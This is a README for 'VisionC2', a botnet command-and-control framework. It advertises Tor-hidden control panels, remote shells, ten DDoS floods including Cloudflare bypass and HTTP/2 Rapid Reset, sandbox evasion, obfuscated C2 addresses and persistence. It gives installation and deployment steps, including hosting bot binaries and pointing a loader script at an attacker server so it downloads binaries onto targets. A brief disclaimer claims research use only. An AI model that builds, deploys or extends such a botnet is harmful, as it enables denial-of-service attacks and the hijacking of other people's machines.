<div align="center">

# VisionC2 

Dual-encrypted (TLS/AES), Tor-routed botnet with remote shells and multi-vector attacks spanning 14 Linux architectures

[Video Showcasing Full Features + Installation](https://www.youtube.com/watch?v=KkIg24KwpB0)

#### VisionC2 now supports Tor Browser

<img width="1399" height="919" alt="image" src="https://github.com/user-attachments/assets/e6bbfd83-725f-4881-8b9d-c6be45b88f27" />


![Go](https://img.shields.io/badge/Go-1.24.0+-00ADD8?style=for-the-badge&logo=go)
![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)
[![Changelog](https://img.shields.io/badge/Changelog-Documentation-blueviolet?style=for-the-badge)](Docs/CHANGELOG.md)

</div>

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Installation](#installation)
- [Usage](#usage)
- [Attack Methods](#attack-methods)
- [Documentation](#documentation)

---

## Features

### C2 Interfaces
Three control options: Tor hidden service web panel, Go TUI, or Telnet CLI. The Tor panel works from any browser without clearnet exposure.

### Network Transport
TLS 1.3 over port 443. SOCKS5 proxy support with multi-relay failover and auto-reconnect. Backconnect relay keeps C2 infrastructure hidden.

### Attack Methods
10 DDoS vectors across L4/L7: UDP/TCP/SYN/ACK/GRE/DNS floods, HTTP/HTTPS request floods, Cloudflare bypass, HTTP/2 Rapid Reset (CVE-2023-44487). Proxy support on all L7 methods.

### Remote Access
Shell access with full output capture and Linux shortcuts. Post-exploit helpers included.

### Evasion
VM/sandbox detection (40+ signatures), string encryption (AES-128-CTR), obfuscated C2 address (6-layer decoding), custom UPX packing.

### Persistence
Systemd, cron watchdog, and rc.local. Fork+setsid daemonization with disguised process names and PID lock.

### Authentication
HMAC registration with MD5 challenge-response and per-campaign sync tokens.

---

## Architecture

**`cnc/`** — C2 server with dual listeners: TLS on 443 for bot connections, embedded Tor service for web panel. Includes interactive TUI and optional Telnet CLI. RBAC with four permission tiers configured in `users.json`.

**`bot/`** — Agent binary. Connects over TLS 1.3 after decoding config, daemonizing, checking for sandboxes, installing persistence, and resolving C2 address.

**`relay/`** — SOCKS5 relay server. Bots connect to relay via TLS, users connect to relay's SOCKS5 port. Disposable infrastructure component.

---

## Installation

### Dependencies
```bash
# Install requirements
sudo apt update && apt install -y openssl git wget gcc python3 screen tor

# Install Go 1.24+
wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
```

**Requirements:** 512MB RAM, 1GB storage, port 443 open  
**Recommended:** Ubuntu 22.04+, 2GB+ RAM

### Setup
```bash
git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
python3 setup.py   # Select [1] Full Setup
```

The setup wizard prompts for C2 address, admin port (default 420), and TLS cert details. Outputs:
- `bins/` — 14 bot binaries (multi-arch)
- `cnc/certificates/` — server.crt + server.key  
- `server` — CNC binary
- `setup_config.txt` — Config summary

To change C2 address later: `python3 setup.py` → option [2]. Redeploy bots afterward.

---

## Usage

<img width="1178" height="821" alt="image" src="https://github.com/user-attachments/assets/b979ffcc-082f-47be-ac8d-206c751fa8f9" />

### Starting the CNC
```bash
./server              # interactive launcher
./server --tui        # TUI mode only
./server --split      # Telnet mode on port 420
./server --daemon     # Telnet headless
```

Run in background: `screen -S vision ./server` (detach with Ctrl+A, D).

### Deploying Bots
Host binaries on separate VPS:
```bash
sudo apt install -y apache2
sudo cp bins/* /var/www/html/bins/
sudo systemctl start apache2
```

Edit `loader.sh` line 3 with your server IP:
```bash
SRV="http://<your-server-ip>/bins"
```

The loader detects target architecture and downloads the matching binary.

---

## Attack Methods

### Layer 4 (Network/Transport)
- **UDP Flood** — High-volume 1024-byte payloads
- **TCP Flood** — Connection table exhaustion  
- **SYN Flood** — Randomized source ports (raw TCP)
- **ACK Flood** — ACK packet spam (raw TCP)
- **GRE Flood** — Protocol 47, max payload
- **DNS Flood** — Randomized query types, reflection

### Layer 7 (Application)
- **HTTP Flood** — GET/POST with randomized headers + user-agents
- **HTTPS/TLS Flood** — TLS handshake exhaustion + burst requests
- **CF Bypass** — Cloudflare bypass via session/cookie reuse + fingerprinting
- **Rapid Reset** — HTTP/2 exploit (CVE-2023-44487), HEADERS + RST_STREAM
- **Proxy Support** — HTTP + SOCKS5 proxy integration on all L7 methods

---

## Documentation

- [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) — System architecture details
- [`CHANGELOG.md`](Docs/CHANGELOG.md) — Version history  
- [`COMMANDS.md`](Docs/COMMANDS.md) — Command reference
- [`SETUP.md`](Docs/SETUP.md) — Setup guide
- [`PROXY.md`](Docs/PROXY.md) — SOCKS5 relay deployment

---

## FAQ / Troubleshooting

### Common Setup Issues

**Q: "go: command not found" or Go version is wrong**
```bash
# Make sure Go is properly installed and in PATH
export PATH=$PATH:/usr/local/go/bin
go version  # Should show 1.24+
```

**Q: "Permission denied" when starting server on port 443**
```bash
# Give the binary permission to bind privileged ports
sudo setcap 'cap_net_bind_service=+ep' ./server
```

**Q: Bots won't connect to C2**
- Check firewall: `sudo ufw allow 443/tcp`
- Verify C2 address in `setup_config.txt` matches your server
- Test TLS connection: `openssl s_client -connect YOUR_IP:443`
- Check server logs for connection attempts

**Q: "No such file or directory" errors during build**
```bash
# Install missing dependencies
sudo apt install -y build-essential gcc python3-dev
```

**Q: Setup script crashes or produces weird errors**
```bash
# Clean install on fresh Ubuntu/Debian system
sudo apt update && apt upgrade -y
# Then retry setup
```

**Q: Relay server won't start**
- Check if ports 9001/1080 are available: `netstat -tulpn | grep :9001`
- Verify relay_server has execute permissions: `chmod +x relay_server`

---

## Legal Disclaimer

For authorized security research and educational purposes only. Usage against targets without prior consent is illegal. Developer assumes no liability for misuse.

---

<div align="center">

**Syn2Much** — [hell@sinners.city](mailto:hell@sinners.city) | [@synacket](https://x.com/synacket)

</div>
